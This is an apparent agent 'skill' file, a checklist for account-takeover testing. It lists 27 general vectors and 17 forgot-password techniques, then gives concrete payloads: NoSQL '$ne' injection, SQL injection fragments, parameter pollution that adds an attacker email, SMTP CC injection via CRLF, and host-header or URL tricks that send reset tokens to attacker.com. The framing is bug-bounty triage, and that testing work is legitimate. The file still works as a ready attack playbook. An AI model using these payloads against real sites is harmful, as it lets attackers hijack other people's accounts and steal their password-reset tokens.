# SKILL: account-takeover
## Trigger Conditions
Any auth feature: register, forgot-password, email change, login.
## Root Cause
Inconsistent identity checks; email normalization flaws; token leaks; broken crypto.
## 27 vectors
1. Re-register: victim@x vs Victim@x vs " victim@x " vs victim@x%00
2. Email verification bypass (2FA techniques)
3. Email normalization in profile update
4. Forgot-password (see below)
5. Login response manipulation
6. Session management flaws
7. OAuth/JWT/SAML misconfig
8. CSRF on email/password
9. Reflected XSS → cookie steal
10. Admin: SQLi, strcmp bypass, type juggling
11. Support portal abuse (fake mailer, ticket)
12. Stored HTMLi → CSRF bypass
13. Android app separate registration
14. SMTP injection on verify
15. Pre-ATO via email change before verify
16. Broken crypto in cookies
17. SQLi: '--, \, ||1#
18. MongoDB: {"passwd":{"$ne":""}}
19. Access token in GET → wayback
20. CouchDB: user=_all_docs
21. Company email: mehul@target.com (space), mehul@TARGET.com
22. Analyze register/forgot/verify
23. Same username with trailing space
24. HPP on forgot
25. IDOR on reset token
26. Session doesn't expire after reset
27. Register username with spaces → reset victim (CVE-2020-7245)
## Forgot Password (17)
i. HHI (host-header-injection.md)
ii. HPP: email=victim@x&email=attacker@x, email[]=..., {"email":[...]}
iii. IDOR on reset token
iv. Broken crypto
v. Token via Referer
vi. Token in response/JS
vii. Token not expiring
viii. Session var trick
ix. Only-space password
x. Two reset links, older works
xi. SMTP: email=victim@x%0d%0aCC%3aattacker@x
xii. ParamMiner for uid/id → IDOR
xiii. POST https://attacker.com/reset.php, POST @attacker.com/reset.php, POST /reset.php@attacker.com
xiv. SQLi
xv. Append .json
xvi. CRLF: /resetpassword?%0d%0aHost:%20attacker.com
xvii. Register username with spaces
## Payloads
{"email":"mehul@x.com%00"}
{"username":" victim ","email":"attacker@x"}
{"password":{"$ne":""}}
user=tuhin--%20-
## Triage
Full ATO → Critical. Pre-ATO → High. Token leak → High.
